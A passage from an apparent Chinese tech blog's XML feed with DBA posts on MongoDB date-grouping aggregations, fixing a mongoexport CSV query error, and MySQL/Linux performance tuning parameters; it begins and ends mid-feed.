报错了，问开发。开发又给了一个查询语句12345678db.antispam_image.aggregate([{ $match: {"moduleId":5,createTs:{$gte:1554048000},createTs:{$lt:1556640000}}},{ $group: { _id :{ $dateToString: {format: "%Y-%m-%d", date:{"$add":[new Date(0),"$createTs"]}} }, count: { $sum: 1 } }}]); 12{ "_id" : "1970-01-19", "count" : 15131 }{ "_id" : "1970-01-18", "count" : 180400 } 发现时间戳转化不对 于是查看官网资料，继续改写先把UNIX时间戳转化为日期。可是MongoDB又没有MySQL那种FROM_UNIXTIME()与UNIX_TIMESTAMP()函数。只能自己造 通过将值乘以1000将createTs字段转换为毫秒时间戳1{ "$multiply": [1000, "$createTs"]} $multiply 将数字相乘以返回产品。接受任意数量的参数表达式。 然后转换为日期1"$add": [ new Date(0), { "$multiply": [1000, "$createTs"]} ] 继续组装查询1{"$group": { "_id": { "year": { "$year": { "$add": [ new Date(0), { "$multiply": [1000, "$createTs"] } ]}}, "mmonth": { "$month": { "$add": [ new Date(0), { "$multiply": [1000, "$createTs"] } ]}}, "day": { "$dayOfMonth": { "$add": [ new Date(0), { "$multiply": [1000, "$createTs"] } ]}}}, "count" : { "$sum" : 1 }}} 在$project管道中完成,方法是将毫秒时间添加到零毫秒Date(0)对象,然后从转换后的日期中提取$year,$month,$dayOfMonth个零件,可以在$group管道中使用这些零件对文档进行分组 完整的查询语句拼接出来1db.antispam_image.aggregate([{ $match: {"moduleId":5,createTs:{$gte:1554048000},createTs:{$lt:1556640000}}}, {"$group": { "_id": { "year": { "$year": { "$add": [ new Date(0), { "$multiply": [1000, "$createTs"] } ]}}, "mmonth": { "$month": { "$add": [ new Date(0), { "$multiply": [1000, "$createTs"] } ]}}, "day": { "$dayOfMonth": { "$add": [ new Date(0), { "$multiply": [1000, "$createTs"] } ] }}}, "count" : { "$sum" : 1 }}}]); 12345678910111213141516171819202122{ "_id" : { "year" : 2019, "mmonth" : 4, "day" : 30 }, "count" : 624 }{ "_id" : { "year" : 2019, "mmonth" : 4, "day" : 28 }, "count" : 695 }{ "_id" : { "year" : 2019, "mmonth" : 4, "day" : 27 }, "count" : 683 }{ "_id" : { "year" : 2019, "mmonth" : 4, "day" : 26 }, "count" : 765 }{ "_id" : { "year" : 2019, "mmonth" : 1, "day" : 12 }, "count" : 610 }{ "_id" : { "year" : 2019, "mmonth" : 1, "day" : 4 }, "count" : 429 }{ "_id" : { "year" : 2019, "mmonth" : 1, "day" : 3 }, "count" : 475 }{ "_id" : { "year" : 2019, "mmonth" : 4, "day" : 29 }, "count" : 732 }{ "_id" : { "year" : 2018, "mmonth" : 12, "day" : 31 }, "count" : 592 }{ "_id" : { "year" : 2018, "mmonth" : 12, "day" : 30 }, "count" : 542 }{ "_id" : { "year" : 2019, "mmonth" : 3, "day" : 14 }, "count" : 1155 }{ "_id" : { "year" : 2019, "mmonth" : 3, "day" : 13 }, "count" : 1169 }{ "_id" : { "year" : 2019, "mmonth" : 4, "day" : 20 }, "count" : 945 }{ "_id" : { "year" : 2019, "mmonth" : 3, "day" : 15 }, "count" : 1062 }{ "_id" : { "year" : 2019, "mmonth" : 4, "day" : 24 }, "count" : 751 }{ "_id" : { "year" : 2018, "mmonth" : 10, "day" : 15 }, "count" : 721 }{ "_id" : { "year" : 2019, "mmonth" : 4, "day" : 18 }, "count" : 895 }{ "_id" : { "year" : 2018, "mmonth" : 10, "day" : 16 }, "count" : 713 }{ "_id" : { "year" : 2019, "mmonth" : 4, "day" : 14 }, "count" : 1278 }{ "_id" : { "year" : 2018, "mmonth" : 10, "day" : 17 }, "count" : 583 }Type "it" for moremgset-11469021:SECONDARY> 拿这样查询出来的数据问开发是否是这样、开发确认这样可以。需求解决。 开发写了一个查询12345678910db.antispam_report.aggregate( [ { $project: { createTs: 1, date1Str: {$dateToString: {format: "%Y-%m-%d", date:{"$add":[new Date(0),{"$multiply":["$createTs",1000]},28800000]}}} } } ]) 添加了时区时间28800000 123456789101112131415161718192021{ "_id" : ObjectId("5bd41d96e870a1daab7a0d6d"), "createTs" : NumberLong(1540627862), "date1Str" : "2018-10-27" }{ "_id" : ObjectId("5bd8fc96e870a1daab5e99c1"), "createTs" : NumberLong(1540947095), "date1Str" : "2018-10-31" }{ "_id" : ObjectId("5bf9ed96e870a1daabe6b236"), "createTs" : NumberLong(1543105942), "date1Str" : "2018-11-25" }{ "_id" : ObjectId("5c025140e870a1daaba6f00c"), "createTs" : NumberLong(1543655744), "date1Str" : "2018-12-01" }{ "_id" : ObjectId("5bffc529e870a1daabadff49"), "createTs" : NumberLong(1543488809), "date1Str" : "2018-11-29" }{ "_id" : ObjectId("5c0ce4b8e870a1daab28b208"), "createTs" : NumberLong(1544348856), "date1Str" : "2018-12-09" }{ "_id" : ObjectId("5bf23dc4e870a1daab3b698c"), "createTs" : NumberLong(1542602181), "date1Str" : "2018-11-19" }{ "_id" : ObjectId("5bf1fdc2e870a1daab7729b1"), "createTs" : NumberLong(1542585793), "date1Str" : "2018-11-19" }{ "_id" : ObjectId("5bf9ed8be870a1daabe57c10"), "createTs" : NumberLong(1543105931), "date1Str" : "2018-11-25" }{ "_id" : ObjectId("5c064d15e870a1daabcb43bd"), "createTs" : NumberLong(1543916821), "date1Str" : "2018-12-04" }{ "_id" : ObjectId("5be44e5ce870a1daabb1b84f"), "createTs" : NumberLong(1541688924), "date1Str" : "2018-11-08" }{ "_id" : ObjectId("5bffeafee870a1daab044619"), "createTs" : NumberLong(1543498494), "date1Str" : "2018-11-29" }{ "_id" : ObjectId("5c076f01e870a1daabe32b96"), "createTs" : NumberLong(1543991041), "date1Str" : "2018-12-05" }{ "_id" : ObjectId("5bdc4cc8e870a1daab855084"), "createTs" : NumberLong(1541164232), "date1Str" : "2018-11-02" }{ "_id" : ObjectId("5bc343d8e870a1daab708be1"), "createTs" : NumberLong(1539523544), "date1Str" : "2018-10-14" }{ "_id" : ObjectId("5bfcd64de870a1daab0d2617"), "createTs" : NumberLong(1543296589), "date1Str" : "2018-11-27" }{ "_id" : ObjectId("5bc9adefe870a1daabf4ab80"), "createTs" : NumberLong(1539943919), "date1Str" : "2018-10-19" }{ "_id" : ObjectId("5bbd8c31e870a1daab26cf3e"), "createTs" : NumberLong(1539148850), "date1Str" : "2018-10-10" }{ "_id" : ObjectId("5beff335e870a1daab8be35a"), "createTs" : NumberLong(1542452021), "date1Str" : "2018-11-17" }{ "_id" : ObjectId("5bc9ae33e870a1daabf4c03a"), "createTs" : NumberLong(1539943987), "date1Str" : "2018-10-19" }Type "it" for more 结论针对DBA这个岗位来说。大多数都是从事MongoDB 运维工作 😂。 很少贴近开发需求，这次开发问了我这个问题。我当然无法立马给出答案。只能不断的查询。拼接，才能马马虎虎的满足了开发的需求 ✅。 刚才问一个架构师，架构师说有一个更简单的方式： 查出总结出一天的数据，放到管道中临时保存起来 在用前一次查询的结束时间作为第二天的开始时间，在加上一天的时间(86400s)得出结尾时间。 查询完成在统一显示打印出来 这种方式就需要使用MongoDB forEach方式实现了。 开发又说不能按时间排序😱 , 妹的😂哪里来的这么多要求😱 参考 MongoDB 官方资料: aggregate资料 MongoDB 聚合查询 - 按时间分组统计 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mongodb数据导出CSV文件]]></title>
    <url>%2F2019%2F05%2F17%2Fmongodb-to-csv%2F</url>
    <content type="text"><![CDATA[要不是因为我，你能有今天？要不是我伤害你，你能成长？ 需求产品需要分析达人文章的标签，需要把2019年1月1号到现在的标签，从mongo导出来，导出格式为csv，查询条件如下：1db.content_medium_hismatch.find({"content_type_id":"28","update_time":{"$gte":1546272000000},"is_delete":0}, {"content_id":1,"content_tags":1}); 操作使用MongoDB中的mongoexport命令1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859mongoexport --helpUsage: mongoexport Export data from MongoDB in CSV or JSON format.See http://docs.mongodb.org/manual/reference/program/mongoexport/ for more information.general options: --help print usage --version print the tool version and exitverbosity options: -v, --verbose= more detailed log output (include multiple times for more verbosity, e.g. -vvvvv, or specify a numeric value, e.g. --verbose=N) --quiet hide all log outputconnection options: -h, --host= mongodb host to connect to (setname/host1,host2 for replica sets) --port= server port (can also use --host hostname:port)ssl options: --ssl connect to a mongod or mongos that has ssl enabled --sslCAFile= the .pem file containing the root certificate chain from the certificate authority --sslPEMKeyFile= the .pem file containing the certificate and key --sslPEMKeyPassword= the password to decrypt the sslPEMKeyFile, if necessary --sslCRLFile= the .pem file containing the certificate revocation list --sslAllowInvalidCertificates bypass the validation for server certificates --sslAllowInvalidHostnames bypass the validation for server name --sslFIPSMode use FIPS mode of the installed openssl libraryauthentication options: -u, --username= username for authentication -p, --password= password for authentication --authenticationDatabase= database that holds the user's credentials --authenticationMechanism= authentication mechanism to usenamespace options: -d, --db= database to use -c, --collection= collection to useoutput options: -f, --fields=[,]* comma separated list of field names (required for exporting CSV) e.g. -f "name,age" --fieldFile= file with field names - 1 per line --type= the output format, either json or csv (defaults to 'json') (default: json) -o, --out= output file; if not specified, stdout is used --jsonArray output to a JSON array rather than one object per line --pretty output JSON formatted to be human-readable --noHeaderLine export CSV data without a list of field names at the first linequerying options: -q, --query= query filter, as a JSON string, e.g., '{x:{$gt:1}}' --queryFile= path to a file containing a query filter (JSON) -k, --slaveOk allow secondary reads if available (default true) (default: false) --readPreference=| specify either a preference name or a preference json object --forceTableScan force a table scan (do not use $snapshot) --skip= number of documents to skip --limit= limit the number of documents to export --sort= sort order, as a JSON string, e.g. '{x:1}' --assertExists if specified, export fails if the collection does not exist (default: false) 操作命令如下:1/usr/local/mongodb/bin/mongoexport --port 29001 --host=localhost -user=*** --password=***** --authenticationDatabase=**** --db=db --collection=collection --query='{"content_type_id":"28","update_time":{"$gte":1546272000000},"is_delete":0}, {"content_id":1,"content_tags":1}' --type=csv --out=***.csv 122019-05-17T13:18:52.325+0800 error validating settings: query '[123 34 99 111 110 116 101 110 116 95 116 121 112 101 95 105 100 34 58 34 50 56 34 44 34 117 112 100 97 116 101 95 116 105 109 101 34 58 123 34 36 103 116 101 34 58 49 53 52 54 50 55 50 48 48 48 48 48 48 125 44 34 105 115 95 100 101 108 101 116 101 34 58 48 125 44 32 123 34 99 111 110 116 101 110 116 95 105 100 34 58 49 44 34 99 111 110 116 101 110 116 95 116 97 103 115 34 58 49 125]' is not valid JSON: invalid character ',' after top-level value2019-05-17T13:18:52.325+0800 try 'mongoexport --help' for more information 初步判断是导出CSV文件中需要的逗号(,)分割。字段发生错误。语句添加–fields _id,content_id,content_tags1/usr/local/mongodb/bin/mongoexport --port 29001 --host=localhost -user=*** --password=***** --authenticationDatabase=**** --db=db --collection=collection --query='{"content_type_id":"28","update_time":{"$gte":1546272000000},"is_delete":0}, {"content_id":1,"content_tags":1}' --type=csv --fields _id,content_id,content_tags --out=***.csv 12`2019-05-17T13:18:54.325+0800 error validating settings: query '[123 34 99 111 110 116 101 110 116 95 116 121 112 101 95 105 100 34 58 34 50 56 34 44 34 117 112 100 97 116 101 95 116 105 109 101 34 58 123 34 36 103 116 101 34 58 49 53 52 54 50 55 50 48 48 48 48 48 48 125 44 34 105 115 95 100 101 108 101 116 101 34 58 48 125 44 32 123 34 99 111 110 116 101 110 116 95 105 100 34 58 49 44 34 99 111 110 116 101 110 116 95 116 97 103 115 34 58 49 125]' is not valid JSON: invalid character ',' after top-level value 2019-05-17T13:18:54.325+0800 try 'mongoexport --help' for more information``bash 开始排查为什么还继续报错。使用 mongo shell 连接到mongodb中查询发现是能获取到数据的。去掉–query 条件之后再执行一次发现是没问题1/usr/local/mongodb/bin/mongoexport --port 29001 --host=localhost -user=*** --password=***** --authenticationDatabase=**** --db=db --collection=collection --type=csv --fields _id,content_id,content_tags --out=***.csv 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556572019-05-17T13:24:18.176+0800 connected to: localhost:290012019-05-17T13:24:19.167+0800 [........................] feeds.content_medium_hismatch 0/138863565 (0.0%)2019-05-17T13:24:20.167+0800 [........................] feeds.content_medium_hismatch 0/138863565 (0.0%)2019-05-17T13:24:21.168+0800 [........................] feeds.content_medium_hismatch 0/138863565 (0.0%)2019-05-17T13:24:22.167+0800 [........................] feeds.content_medium_hismatch 0/138863565 (0.0%)2019-05-17T13:24:23.168+0800 [........................] feeds.content_medium_hismatch 0/138863565 (0.0%)2019-05-17T13:24:24.168+0800 [........................] feeds.content_medium_hismatch 0/138863565 (0.0%)2019-05-17T13:24:25.167+0800 [........................] feeds.content_medium_hismatch 0/138863565 (0.0%)2019-05-17T13:24:26.168+0800 [........................] feeds.content_medium_hismatch 0/138863565 (0.0%)^C2019-05-17T13:24:26.900+0800 signal 'interrupt' received; forcefully terminatingpublic-ops-mongodb2 seclogin # lscontent_medium_hismatch.csvpublic-ops-mongodb2 seclogin # cat content_medium_hismatch.csv |more_id,content_id,content_tagsObjectId(5b0f598eaeeb42d8582db599),1229,"[""奶瓶"",""吃奶"",""吸吮"",""乳头混淆"",""母乳""]"ObjectId(5b0f598eaeeb42d8582db5c8),1290,"[""衣服"",""二手衣服"",""清洗"",""皮肤"",""细菌""]"ObjectId(5b0f598eaeeb42d8582db5cd),1297,"[""身材"",""产后妈妈"",""新妈妈"",""裙子"",""衣服""]"ObjectId(5b0f598eaeeb42d8582db5e1),1325,"[""护肤品"",""哺乳期"",""皮肤"",""健康"",""护肤""]"ObjectId(5b0f598eaeeb42d8582db5e8),1343,"[""收纳"",""家具"",""奶粉"",""分享"",""三角形""]"ObjectId(5b0f598eaeeb42d8582db618),1393,"[""背带"",""婴儿"",""带宝宝"",""出门"",""肌肉发育""]"ObjectId(5b0f598eaeeb42d8582db65e),1465,"[""维生素"",""食物"",""骨骼"",""眼睛"",""帮助""]"ObjectId(5b0f598eaeeb42d8582db660),1467,"[""晒太阳"",""紫外线"",""维生素"",""黄疸"",""眼睛""]"ObjectId(5b0f598eaeeb42d8582db666),1472,"[""伞车"",""推车"",""婴儿伞车"",""婴儿推车"",""优点""]"ObjectId(5b0f598eaeeb42d8582db669),1474,"[""食物"",""味觉发育"",""口味"",""食盐"",""饮食""]"ObjectId(5b0f598eaeeb42d8582db674),1490,"[""患病"",""父母"",""指甲"",""健康"",""打呼噜""]"ObjectId(5b0f598eaeeb42d8582db67a),1500,"[""睡眠"",""疾病"",""父母"",""症状"",""医院""]"ObjectId(5b0f598eaeeb42d8582db68c),1513,"[""声音"",""奶睡"",""美国"",""摇晃"",""宝宝睡觉""]"ObjectId(5b0f598eaeeb42d8582db6a0),1535,"[""安全"",""清洗"",""坐便器"",""马桶"",""优点""]"ObjectId(5b0f598eaeeb42d8582db746),2732,"[""荔枝"",""进食"",""葡萄糖"",""上火"",""症状""]"ObjectId(5b0f598eaeeb42d8582db749),2733,"[""宝宝喂养"",""食物"",""辅食"",""母乳"",""饮食""]"ObjectId(5b0f598eaeeb42d8582db752),2742,"[""乳头"",""喂奶"",""乳头皲裂"",""哺乳"",""乳房""]"ObjectId(5b0f598eaeeb42d8582db758),2745,"[""食物"",""挑食"",""偏食"",""爸爸"",""菠菜""]"ObjectId(5b0f598eaeeb42d8582db75b),2746,"[""吃饭"",""爸爸"",""咀嚼"",""食物"",""时间""]"ObjectId(5b0f598eaeeb42d8582db75f),2747,"[""辅食"",""小宝"",""核桃油"",""健康"",""亚麻酸""]"ObjectId(5b0f598eaeeb42d8582db761),2748,"[""油炸"",""健康"",""食品"",""食物"",""油脂""]"ObjectId(5b0f598eaeeb42d8582db768),2751,"[""辅食"",""膳食纤维"",""消化不良"",""食物"",""肠道""]"ObjectId(5b0f598eaeeb42d8582db76d),2753,"[""吃饭"",""饮食习惯"",""帮助"",""习惯"",""爸爸""]"ObjectId(5b0f598eaeeb42d8582db770),2754,"[""微波炉"",""辅食"",""营养"",""食物"",""维生素""]"ObjectId(5b0f598eaeeb42d8582db773),2755,"[""葡萄糖"",""营养"",""习惯"",""家长"",""宝宝生病""]"ObjectId(5b0f598eaeeb42d8582db775),2756,"[""祛湿"",""食物"",""帮助"",""食谱"",""红豆""]"ObjectId(5b0f598eaeeb42d8582db778),2757,"[""水果"",""蔬菜"",""果汁"",""配方奶"",""母乳""]"ObjectId(5b0f598eaeeb42d8582db77e),2759,"[""挑食"",""维生素"",""营养"",""宝宝挑食"",""缺锌""]"ObjectId(5b0f598eaeeb42d8582db781),2760,"[""吃肉"",""健康"",""水果"",""饱和脂肪酸"",""便秘""]"ObjectId(5b0f598eaeeb42d8582db784),2761,"[""水果"",""营养"",""食物"",""胡萝卜素"",""维生素""]"ObjectId(5b0f598eaeeb42d8582db787),2762,"[""体重"",""宝宝瘦"",""营养不良"",""原因"",""父母""]"ObjectId(5b0f598eaeeb42d8582db789),2763,"[""食物"",""营养"",""宝宝喂养"",""进食"",""时间""]"ObjectId(5b0f598eaeeb42d8582db790),2765,"[""辅食"",""宝宝断奶"",""断奶"",""保存"",""冰箱""]"ObjectId(5b0f598eaeeb42d8582db792),2766,"[""断奶"",""母乳"",""环境"",""夏季"",""宝宝生病""]"ObjectId(5b0f598eaeeb42d8582db795),2767,"[""益生菌"",""药物"",""食品"",""平衡"",""抗生素""]"ObjectId(5b0f598eaeeb42d8582db798),2768,"[""食物"",""咳嗽"",""宝宝咳嗽"",""饮食"",""辛辣""]"ObjectId(5b0f598eaeeb42d8582db79b),2769,"[""辅食"",""饮食"",""断奶"",""宝宝断奶"",""保存""]"ObjectId(5b0f598eaeeb42d8582db7a1),2773,"[""补钙"",""维生素"",""宝宝缺钙"",""母乳"",""配方奶""]"ObjectId(5b0f598faeeb42d8582db7a6),2775,"[""果泥"",""水果"",""维生素"",""哈密瓜"",""香蕉""]"ObjectId(5b0f598faeeb42d8582db7a9),2776,"[""饮食"",""食物"",""辅食"",""进食"",""水果""]"ObjectId(5b0f598faeeb42d8582db7ac),2777,"[""有机蔬菜"",""蔬菜"",""农药"",""有机"",""农药残留""]"ObjectId(5b0f598faeeb42d8582db7b4),2780,"[""断奶"",""乳头"",""乳房"",""乳腺炎"",""回奶""]"ObjectId(5b0f598faeeb42d8582db7b8),2783,"[""叶黄素"",""太阳镜"",""胡萝卜"",""南瓜"",""芒果""]" 就能确定这么执行是没有问题。重点排查--query条件。根据之前报错122019-05-17T13:25:56.341+0800 error validating settings: query '[123 99 111 110 116 101 110 116 95 116 121 112 101 95 105 100 58 50 56 44 117 112 100 97 116 101 95 116 105 109 101 58 123 36 103 116 101 58 49 53 52 54 50 55 50 48 48 48 48 48 48 125 44 105 115 95 100 101 108 101 116 101 58 48 125 44 123 99 111 110 116 101 110 116 95 105 100 58 49 44 99 111 110 116 101 110 116 95 116 97 103 115 58 49 125]' is not valid JSON: invalid character ',' after top-level value2019-05-17T13:25:56.341+0800 try 'mongoexport --help' for more information 发现一个点invalid character ',' after top-level value中提示有逗号,的问题，排查一下--query条件发现有'{"content_type_id":"28","update_time":{"$gte":1546272000000},"is_delete":0}, {"content_id":1,"content_tags":1}'有一个逗号, 去掉逗号,和后面的逗号之后的条件发现执行成功1/usr/local/mongodb/bin/mongoexport --port 29001 --host=localhost -user=*** --password=***** --authenticationDatabase=**** --db=db --collection=collection --query='{"content_type_id":"28","update_time":{"$gte":1546272000000},"is_delete":0}' --type=csv --fields _id,content_id,content_tags --out=***.csv 1234567892019-05-17T13:41:33.068+0800 connected to: localhost:290012019-05-17T13:41:34.067+0800 feeds.content_medium_hismatch 02019-05-17T13:41:35.067+0800 feeds.content_medium_hismatch 02019-05-17T13:41:36.067+0800 feeds.content_medium_hismatch 02019-05-17T13:41:36.656+0800 feeds.content_medium_hismatch 188702019-05-17T13:41:36.656+0800 exported 18870 recordspublic-ops-mongodb2 seclogin # cat content_medium_hismatch.csv |wc -l18871public-ops-mongodb2 seclogin # 和开发确认一下这个条件能否却掉，开发确认可以去掉。 总结mongoexport在执行有条件的导出文件，--query 条件要写在一个花括号{}里面，如果要有两个花括号{}的条件，中间用逗号,分割，这样是不行的。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[详细的MySQL高性能优化实战总结]]></title>
    <url>%2F2019%2F05%2F16%2Fmysql-innodb%2F</url>
    <content type="text"><![CDATA[努力不一定成功，但是不努力会很舒服的哦! 前言MySQL 对于很多 Linux 从业者而言，是一个非常棘手的问题，多数情况都是因为对数据库出现问题的情况和处理思路不清晰。 在进行 MySQL 的优化之前必须要了解的就是 MySQL 的查询过程，很多的查询优化工作实际上就是遵循一些原则让 MySQL 的优化器能够按照预想的合理方式运行而已。 优化 优化的哲学 注：优化有风险，修改需谨慎。 优化可能带来的问题： 优化不总是对一个单纯的环境进行，还很可能是一个复杂的已投产的系统。 优化手段本来就有很大的风险，只不过你没能力意识到和预见到。 任何的技术可以解决一个问题，但必然存在带来一个问题的风险。 对于优化来说解决问题而带来的问题，控制在可接受的范围内才是有成果。 保持现状或出现更差的情况都是失败。 优化的需求： 稳定性和业务可持续性，通常比性能更重要。 优化不可避免涉及到变更，变更就有风险。 优化使性能变好，维持和变差是等概率事件。 切记优化，应该是各部门协同，共同参与的工作，任何单一部门都不能对数据库进行优化。 所以优化工作，是由业务需求驱使的! 优化由谁参与?在进行数据库优化时，应由数据库管理员、业务部门代表、应用程序架构师、应用程序设计人员、应用程序开发人员、硬件及系统管理员、存储管理员等，业务相关人员共同参与。 优化思路优化什么在数据库优化上有两个主要方面： 安全：数据可持续性。 性能：数据的高性能访问。 优化的范围有哪些存储、主机和操作系统方面： 主机架构稳定性 I/O 规划及配置 Swap 交换分区 OS 内核参数和网络问题 应用程序方面： 应用程序稳定性 SQL 语句性能 串行访问资源 性能欠佳会话管理 这个应用适不适合用 MySQL 数据库优化方面： 内存 数据库结构(物理&逻辑) 实例配置 说明：不管是设计系统、定位问题还是优化，都可以按照这个顺序执行。 优化维度 数据库优化维度有如下四个: 硬件 系统配置 数据库表结构 SQL 及索引 优化选择: 优化成本：硬件>系统配置>数据库表结构>SQL 及索引。 优化效果：硬件系统>应用>数据库>架构(高可用、读写分离、分库分表)。 处理方向：明确优化目标、性能和安全的折中、防患未然。 硬件优化主机方面根据数据库类型，主机 CPU 选择、内存容量选择、磁盘选择： 平衡内存和磁盘资源 随机的 I/O 和顺序的 I/O 主机 RAID 卡的 BBU(Battery Backup Unit)关闭 CPU 的选择CPU 的两个关键因素：核数、主频。根据不同的业务类型进行选择： CPU 密集型：计算比较多，OLTP 主频很高的 CPU、核数还要多。 IO 密集型：查询比较，OLAP 核数要多，主频不一定高的。 内存的选择OLAP 类型数据库，需要更多内存，和数据获取量级有关。OLTP 类型数据一般内存是 CPU 核心数量的 2 倍到 4 倍，没有最佳实践。 存储方面根据存储数据种类的不同，选择不同的存储设备，配置合理的 RAID 级别(raid5、raid10、热备盘)。 对于操作系统来讲，不需要太特殊的选择，最好做好冗余(raid1)(ssd、sas、sata)。 主机 raid 卡选择： 实现操作系统磁盘的冗余(raid1) 平衡内存和磁盘资源 随机的 I/O 和顺序的 I/O 主机 raid 卡的 BBU(Battery Backup Unit)要关闭 网络设备方面使用流量支持更高的网络设备(交换机、路由器、网线、网卡、HBA 卡)。注意：以上这些规划应该在初始设计系统时就应该考虑好。 服务器硬件优化服务器硬件优化关键点： 物理状态灯 自带管理设备：远程控制卡(FENCE设备：ipmi ilo idarc)、开关机、硬件监控。 第三方的监控软件、设备(snmp、agent)对物理设施进行监控。 存储设备：自带的监控平台。EMC2(HP 收购了)、 日立(HDS)、IBM 低端 OEM HDS、高端存储是自己技术，华为存储。 系统优化CPU：基本不需要调整，在硬件选择方面下功夫即可。 内存：基本不需要调整，在硬件选择方面下功夫即可。 SWAP：MySQL 尽量避免使用 Swap。阿里云的服务器中默认 swap 为 0。 IO ：raid、no lvm、ext4 或 xfs、ssd、IO 调度策略。 Swap 调整(不使用 swap 分区)：1/proc/sys/vm/swappiness的内容改成0(临时)，/etc/sysctl. conf上添加vm.swappiness=0(永久) 这个参数决定了 Linux 是倾向于使用 Swap，还是倾向于释放文件系统 Cache。在内存紧张的情况下，数值越低越倾向于释放文件系统 Cache。 当然，这个参数只能减少使用 Swap 的概率，并不能避免 Linux 使用 Swap。 修改 MySQL 的配置参数 innodb_flush_ method，开启 O_DIRECT 模式。 这种情况下，InnoDB 的 buffer pool 会直接绕过文件系统 Cache 来访问磁盘，但是 redo log 依旧会使用文件系统 Cache。 值得注意的是，Redo log 是覆写模式的，即使使用了文件系统的 Cache，也不会占用太多。 IO 调度策略：1#echo deadline>/sys/block/sda/queue/scheduler 临时修改为deadline 永久修改123vi /boot/grub/grub.conf 更改到如下内容: kernel /boot/vmlinuz-2.6.18-8.el5 ro root=LABEL=/ elevator=deadline rhgb quiet 系统参数调整Linux 系统内核参数优化12345vim/etc/sysctl.conf net.ipv4.ip_local_port_range = 1024 65535：# 用户端口范围 net.ipv4.tcp_max_syn_backlog = 4096 net.ipv4.tcp_fin_timeout = 30 fs.file-max=65535：# 系统最大文件句柄，控制的是能打开文件最大数量 用户限制参数(MySQL 可以不设置以下配置)：12345vim/etc/security/limits.conf * soft nproc 65535 * hard nproc 65535 * soft nofile 65535 * hard nofile 65535 应用优化业务应用和数据库应用独立。 防火墙：iptables、selinux 等其他无用服务(关闭)：123456789101112131415chkconfig --level 23456 acpid off chkconfig --level 23456 anacron off chkconfig --level 23456 autofs off chkconfig --level 23456 avahi-daemon off chkconfig --level 23456 bluetooth off chkconfig --level 23456 cups off chkconfig --level 23456 firstboot off chkconfig --level 23456 haldaemon off chkconfig --level 23456 hplip off chkconfig --level 23456 ip6tables off chkconfig --level 23456 iptables off chkconfig --level 23456 isdn off chkconfig --level 23456 pcscd off chkconfig --level 23456 sendmail off chkconfig --level 23456 yum-updatesd off 安装图形界面的服务器不要启动图形界面 runlevel 3。 另外，思考将来我们的业务是否真的需要 MySQL，还是使用其他种类的数据库。用数据库的最高境界就是不用数据库。 数据库优化SQL 优化方向： 执行计划 索引 SQL 改写 架构优化方向： 高可用架构 高性能架构 分库分表 数据库参数优化调整实例整体(高级优化，扩展)：123456thread_concurrency：# 并发线程数量个数 sort_buffer_size：# 排序缓存 read_buffer_size：# 顺序读取缓存 read_rnd_buffer_size：# 随机读取缓存 key_buffer_size：# 索引缓存 thread_cache_size：# (1G—>8, 2G—>16, 3G—>32, >3G—>64) 连接层(基础优化)设置合理的连接客户和连接方式：123456789101112131415161718192021222324252627282930max_connections # 最大连接数，看交易笔数设置 max_connect_errors # 最大错误连接数，能大则大 connect_timeout # 连接超时 max_user_connections # 最大用户连接数 skip-name-resolve # 跳过域名解析 wait_timeout # 等待超时 back_log # 可以在堆栈中的连接数量 ``` ##### SQL 层(基础优化)query_cache_size： 查询缓存 >>> OLAP 类型数据库，需要重点加大此内存缓存，但是一般不会超过 GB。对于经常被修改的数据，缓存会马上失效。我们可以使用内存数据库(redis、memecache)，替代它的功能。##### 存储引擎层优化innodb 基础优化参数：```bashdefault-storage-engine innodb_buffer_pool_size # 没有固定大小，50%测试值，看看情况再微调。但是尽量设置不要超过物理内存70% innodb_file_per_table=(1,0) innodb_flush_log_at_trx_commit=(0,1,2) # 1是最安全的，0是性能最高，2折中 binlog_sync Innodb_flush_method=(O_DIRECT, fdatasync) innodb_log_buffer_size # 100M以下 innodb_log_file_size # 100M 以下 innodb_log_files_in_group # 5个成员以下,一般2-3个够用（iblogfile0-N） innodb_max_dirty_pages_pct # 达到百分之75的时候刷写 内存脏页到磁盘。 log_bin max_binlog_cache_size # 可以不设置 max_binlog_size # 可以不设置 innodb_additional_mem_pool_size #小于2G内存的机器，推荐值是20M。32G内存以上100M 参考文章51CTO传媒: 一份超详细的MySQL高性能优化实战总结 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pt-table-checksum fails on older MySQL without utf8mb4-support]]></title>
    <url>%2F2019%2F05%2F14%2FPT-0%2F</url>
